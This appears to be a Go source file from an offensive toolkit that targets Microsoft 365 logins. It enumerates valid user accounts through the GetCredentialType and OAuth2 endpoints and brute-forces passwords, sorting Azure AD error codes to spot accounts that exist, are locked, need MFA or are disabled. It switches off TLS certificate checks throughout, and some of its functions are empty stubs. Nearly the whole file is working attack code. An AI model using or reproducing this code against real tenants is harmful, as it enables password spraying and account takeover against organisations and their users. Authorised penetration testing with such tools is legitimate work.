package o365

import (
	"GoMapEnum/src/utils"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

// OFFICE_URL is used to get parameter for office user enumeration
var OFFICE_URL = "https://www.office.com"

// MICROSOFT_ONLINE_URL is the URL to performed user enumeration
var MICROSOFT_ONLINE_URL = "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US"

// VALIDATE_TENANT_URL is the url to validate if a tenant exist or not
var VALIDATE_TENANT_URL = "https://login.microsoftonline.com/getuserrealm.srf?login=user@%s&xml=1"

// OAUTH2_URL is the URL to authenticate with oauth2 method
var OAUTH2_URL = "https://login.microsoft.com/common/oauth2/token"

// enumOffice return a bool if the user exist or not
func (options *Options) enumOffice(email string) bool {
	var exist = false
	// Get headers
	appId, resp := options.getDataInWebsite(OFFICE_URL, "", `, appId: '(.*?)' `)
	// If resp is nil something went wrong
	if resp == nil {
		return false
	}
	var out []string
	// Sometime, the response is not what expected so you retry max 3 times to get the fields
	i := 0
	for {
		out, resp = options.getDataInWebsite(OFFICE_URL+"/login?es=Click&ru=/&msafed=0", "x-ms-request-id", `hpgid":([0-9]+),`, `hpgact":([0-9]+),`, `"sCtx":"(.*?)"`)
		// If resp is nil something went wrong
		if resp == nil {
			return false
		}
		// If there are all the fields we can continue
		if len(out) == 4 {
			break
		}
		// Retry 3 times
		if i == 3 {
			options.Log.Error("Unable to retrieve all the field to authenticate")
			return false
		}
		i++
	}
	clientId := appId[0]
	hpgid := out[0]
	hpgact := out[1]
	sCtx := out[2]
	hpgrequestid := out[3]

	// Test the user
	// Prepare the data
	var officeDataToSend officeData
	officeDataToSend.IsOtherIdpSupported = true
	officeDataToSend.IsRemoteNGCSupported = true
	officeDataToSend.IsAccessPassSupported = true
	officeDataToSend.CheckPhones = false
	officeDataToSend.IsCookieBannerShown = false
	officeDataToSend.IsFidoSupported = false
	officeDataToSend.Forceotclogin = false
	officeDataToSend.IsExternalFederationDisallowed = false
	officeDataToSend.IsRemoteConnectSupported = false
	officeDataToSend.IsSignup = false
	officeDataToSend.FederationFlags = 0
	officeDataToSend.OriginalRequest = sCtx
	officeDataToSend.Username = email

	jsonData, _ := json.Marshal(officeDataToSend)
	req, _ := http.NewRequest("POST", MICROSOFT_ONLINE_URL, bytes.NewBuffer(jsonData))

	req.Header.Add("Origin", "https://login.microsoftonline.com")
	req.Header.Add("Accept", "application/json")
	req.Header.Add("hpgact", hpgact)
	req.Header.Add("hpgid", hpgid)
	req.Header.Add("client-request-id", clientId)
	req.Header.Add("hpgrequestid", hpgrequestid)
	req.Header.Add("Referer", resp.Request.URL.String())
	req.Header.Add("Canary", utils.RandomString(248))

	client := &http.Client{

		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           options.Proxy,
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		options.Log.Error("Error on response.\n[ERRO] - " + err.Error())
	}
	if resp.StatusCode == 200 {
		body, _ := ioutil.ReadAll(resp.Body)
		var respStruct officeResponse
		json.Unmarshal(body, &respStruct)
		if respStruct.EstsProperties.DesktopSsoEnabled != nil && !*respStruct.EstsProperties.DesktopSsoEnabled {
			options.Log.Fail(email + " Desktop SSO disabled")
			return exist
		}

		if respStruct.ThrottleStatus == 1 {
			options.Log.Fail(email + " Requests are being throttled")
			return exist
		}

		if respStruct.IfExistsResult == 0 || respStruct.IfExistsResult == 6 {
			options.Log.Success(email)
			exist = true
		} else if respStruct.IfExistsResult == 5 {
			options.Log.Info(email + " exist but is from a different identity provider (maybe a personal account)")
			exist = true
		} else {
			options.Log.Fail(email)
		}

	} else {
		options.Log.Fail(email)
	}
	return exist
}

func (options *Options) enumOauth2(username string) bool {
	var valid = false
	password := utils.RandomString(10)
	respStruct := options.requestOauth2(username, password)
	if respStruct.ErrorDescription != "" {
		code := strings.Split(respStruct.ErrorDescription, ":")[0]
		switch code { // https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
		case "AADSTS50053":
			options.Log.Info(username + " is locked")
		case "AADSTS50126":
			options.Log.Success(username + " exists") //Wrong password
			valid = true
		case "AADSTS50055":
			options.Log.Success(username + " exists but the password is expired")
			valid = true
		case "AADSTS50056":
			options.Log.Success(username + " exists but there is no password")
			valid = true
		case "AADSTS50014":
			options.Log.Success(username + " exists but max passthru auth time exceeded")
			valid = true
		case "AADSTS50076": // Due to a configuration change made by your administrator, or because you moved to a new location, you must use multi-factor authentication to access
			options.Log.Success(username + " MFA needed")
			valid = true
		case "AADSTS50057":
			options.Log.Success(username + " and " + password + " matched but the account is disabled")
			valid = true
		case "AADSTS700016":
			options.Log.Error(username + " The application wasn't found in the directory/tenant")
		case "AADSTS50034": // UserAccountNotFound - To sign into this application, the account must be added to the directory.
			options.Log.Fail(username + " does not exist")
		case "AADSTS90002":
			options.Log.Error("The Tenant '" + username + "' does not exist")
		default:
			options.Log.Error("Unknow error: " + respStruct.ErrorDescription)

		}
	}

	return valid

}

func (options *Options) enumOnedrive(email string) bool {
	var exist = false

	return exist
}

func (options *Options) bruteOauth2(username, password string) (bool, error) {
	var valid = false
	respStruct := options.requestOauth2(username, password)
	if respStruct.ErrorDescription != "" {
		code := strings.Split(respStruct.ErrorDescription, ":")[0]

		switch code { // https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
		case "AADSTS50053":
			options.Log.Info(username + " is locked")
			return false, utils.ErrLockout
		case "AADSTS50126":
			options.Log.Fail(username + " exists but the password is wrong")
		case "AADSTS50055":
			options.Log.Success(username + " exists but the password is expired")
			valid = true
		case "AADSTS50056":
			options.Log.Success(username + " exists but there is no password")
			valid = true
		case "AADSTS50014":
			options.Log.Error(username + " exists but max passthru auth time exceeded")
		case "AADSTS50076": // Due to a configuration change made by your administrator, or because you moved to a new location, you must use multi-factor authentication to access
			options.Log.Info(username + " MFA needed")
			valid = true
		case "AADSTS50057":
			options.Log.Info(username + " and " + password + " matched but the account is disabled")
			valid = true
		case "AADSTS700016":
			options.Log.Error(username + " The application wasn't found in the directory/tenant")
		case "AADSTS50034": // UserAccountNotFound - To sign into this application, the account must be added to the directory.
			options.Log.Fail(username + " does not exist")
		case "AADSTS90002":
			options.Log.Error("The Tenant '" + username + "' does not exist")
		default:
			options.Log.Error("Unknow error: " + respStruct.ErrorDescription)

		}
	} else if respStruct.AccessToken != "" {
		valid = true
		options.Log.Success(username + " / " + password + " matched")

	}
	if !valid {
		options.Log.Debug(username + " / " + password + " did not match")

	}
	return valid, nil
}

func bruteAutodiscover(email, password string) bool {
	var valid = false

	return valid
}

func (options *Options) getDataInWebsite(url, header string, regexes ...string) ([]string, *http.Response) {
	// Get random user agent
	userAgent := utils.GetUserAgent()

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Add("User-Agent", userAgent)
	client := &http.Client{

		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           options.Proxy,
		},
	}
	resp, err := client.Do(req)
	var returnValue = []string{}
	if err != nil {
		options.Log.Error("Error on response.\n[ERRO] - " + err.Error())
		return returnValue, nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	for _, regex := range regexes {
		re := regexp.MustCompile(regex)
		if out := re.FindStringSubmatch(string(body)); len(out) > 0 {
			returnValue = append(returnValue, out[1])
		}
	}
	if header != "" {
		returnValue = append(returnValue, resp.Header.Get(header))
	}
	return returnValue, resp
}

func (options *Options) validTenant(domain string) bool {
	url := fmt.Sprintf(VALIDATE_TENANT_URL, domain)
	req, _ := http.NewRequest("GET", url, nil)
	client := &http.Client{

		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           options.Proxy,
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		options.Log.Error("Error on response.\n[ERRO] - " + err.Error())
		return false
	}
	body, _ := ioutil.ReadAll(resp.Body)
	var realmData realmInfo
	xml.Unmarshal(body, &realmData)
	if realmData.NameSpaceType == "Federated" || realmData.NameSpaceType == "Managed" {
		return true
	}
	return false
}

func (options *Options) requestOauth2(username, password string) oauth2Output {
	var data oauth2Data
	data.ClientID = "1b730954-1685-4b74-9bfd-dac224a7b894"
	data.GrantType = "password"
	data.Resource = "https://graph.windows.net"
	data.Scope = "openid"
	data.Username = username
	data.Password = password

	form := utils.StructToMap(&data)

	req, _ := http.NewRequest("POST", OAUTH2_URL, strings.NewReader(form.Encode()))

	client := &http.Client{

		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           options.Proxy,
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		options.Log.Error("Error on response.\n[ERRO] - " + err.Error())
	}
	body, _ := ioutil.ReadAll(resp.Body)
	var respStruct oauth2Output
	json.Unmarshal(body, &respStruct)

	return respStruct
}
